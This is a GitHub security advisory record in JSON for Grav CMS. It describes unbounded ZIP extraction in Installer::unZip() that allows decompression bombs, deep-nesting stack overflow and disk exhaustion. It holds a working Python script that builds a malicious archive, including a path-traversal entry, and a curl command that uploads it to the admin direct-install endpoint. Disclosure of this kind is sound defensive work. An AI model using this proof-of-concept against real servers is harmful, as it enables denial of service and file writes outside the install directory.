@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-2vcx-h8p2-9pg9",
+  "modified": "2026-09-16T22:12:10Z",
+  "published": "2026-09-16T22:12:10Z",
+  "aliases": [
+    "CVE-2026-59193"
+  ],
+  "summary": "Grav CMS — Improper Handling of Highly Compressed Data in Installer::unZip()",
+  "details": "### Summary\nAn authenticated admin.super user can crash Grav or fill the disk by uploading a specially crafted ZIP archive through the Direct Install tool. The method `Installer::unZip()` calls `ZipArchive::extractTo()` without any limit on uncompressed size, entry count, or directory depth, enabling Zip Bomb (CWE-409), stack overflow (CWE-674), and disk/inode exhaustion.\n### Details\nThe vulnerability is in `system/src/Grav/Common/GPM/Installer.php:176-208` (`Installer::unZip()`). The `ZipArchive::extractTo()` call at line 184 is not preceded by any validation of the archive contents.\n\nMissing validation:\n- ❌ No total uncompressed size check (decompression bomb — CWE-409)\n- ❌ No entry count check (inode exhaustion)\n- ❌ No directory nesting depth check (stack overflow in `Folder::doDelete()` — CWE-674)\n\nThe subsequent cleanup call `Folder::delete($destination)` at line 189 recursively deletes every subdirectory without depth limit (`Folder.php:531-547`). A ZIP with thousands of nested directories will cause PHP's maximum nesting level to be exceeded, so the cleanup fails silently and leaves extracted files on disk.\n\nThe existing Zip Slip fix (GHSA-w48r-jppp-rcfw / CVE-2026-42607, commit 5a12f9be8) only checks for `../` in entry paths and does not add any size, count, or depth limits.\n### PoC\n1. Generate the malicious ZIP:\n\n   python3 cve_poc_grav_zip.py:\n```python\n#!/usr/bin/env python3\n\"\"\"\nCVE PoC — Grav CMS Installer::unZip()\nZip Bomb + Zip Slip + Deep Nesting\nZIP file to attach to the CVE advisory.\n\nNote: Zip Slip (../) already has CVE-2026-42607. This PoC targets the Zip Bomb (CWE-409)\nwhich has NO CVE — extracted size/depth/count have no limits.\n\"\"\"\n\nimport zipfile, os, sys\n\nOUT = \"/tmp/cve_poc_grav.zip\"\n\ndef build():\n    with zipfile.ZipFile(OUT, 'w', zipfile.ZIP_DEFLATED) as z:\n        # --- Zip Slip: arbitrary write outside target ---\n        z.writestr(\"../../../tmp/CVE_POC_SLIP\", \"ZIP SLIP: writes outside target\\n\")\n\n        # --- Deep nesting: 100 levels → Folder::delete() has no depth limit ---\n        for i in range(100):\n            z.writestr(f\"deep/{'x/' * i}.keep\", \"\")\n\n        # --- Compression bomb: 100 identical files = ratio ~ 196:1 ---\n        for i in range(100):\n            z.writestr(f\"bomb/{i}.dat\", b\"A\" * 100_000)\n\n    with zipfile.ZipFile(OUT) as z:\n        infos = z.infolist()\n        compressed = os.path.getsize(OUT)\n        uncompressed = sum(e.file_size for e in infos)\n        slip = any(\"..\" in e.filename for e in infos)\n        depths = [e.filename.count('/') for e in infos]\n\n    print(\"=\" * 60)\n    print(\"CVE PoC — Grav CMS Installer::unZip()\")\n    print(\"Zip Bomb | Zip Slip | Deep Nesting\")\n    print(\"=\" * 60)\n    print(f\"File           : {OUT}\")\n    print(f\"ZIP size       : {compressed:,} B ({compressed/1024:.1f} KB)\")\n    print(f\"Uncompressed   : {uncompressed:,} B ({uncompressed/1024/1024:.1f} MB)\")\n    print(f\"Ratio          : {uncompressed/compressed:.0f}:1\")\n    print(f\"Entries        : {len(infos)}\")\n    print(f\"Max depth      : {max(depths) if depths else 0}\")\n    print(f\"Zip Slip (../) : {'YES' if slip else 'NO'}\")\n    print(f\"\\nUpload via Grav Admin → /admin/tools/direct-install?task=directInstall\")\n    print(f\"Result: disk exhaustion + Folder::delete() stack overflow + arbitrary write\")\nif __name__ == \"__main__\":\n    build()\n```\n\n3. Authenticate as admin.super and retrieve the nonce from /admin\n\n4. Upload through Direct Install:\n```\n   curl -X POST 'https://target/admin/tools/direct-install?task=directInstall' \\\n     -H 'Cookie: grav-admin=<SESSION>' \\\n     -F 'admin-nonce=<NONCE>' \\\n     -F 'uploaded_file=@/tmp/cve_poc_grav.zip'\n```\nResult: server extracts all entries (9.5 MB → 200 files + 100 nesting levels). The cleanup crashes with \"Maximum function nesting level reached\" due to 100-level deep recursion.\n### Impact\n\nAn authenticated administrator (admin.super) can:\n- Fill the server disk with highly compressed data (196:1 ratio with simple repeating data, up to 10^11:1 with nested ZIP bombs)\n- Exhaust inodes via thousands of small files\n- Trigger a PHP stack overflow via deep directory nesting that prevents cleanup, leaving files on disk permanently\n- Partially or fully deny service to all users (both authenticated and unauthenticated)",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.0.0"
+            },
+            {
+              "fixed": "2.0.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-2vcx-h8p2-9pg9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59193"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/23d6f2adf4ce11889c088ac8557c8314baeef781"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/releases/tag/2.0.0"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-409"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-16T22:12:10Z",
+    "nvd_published_at": "2026-07-10T17:17:02Z"
+  }
+}
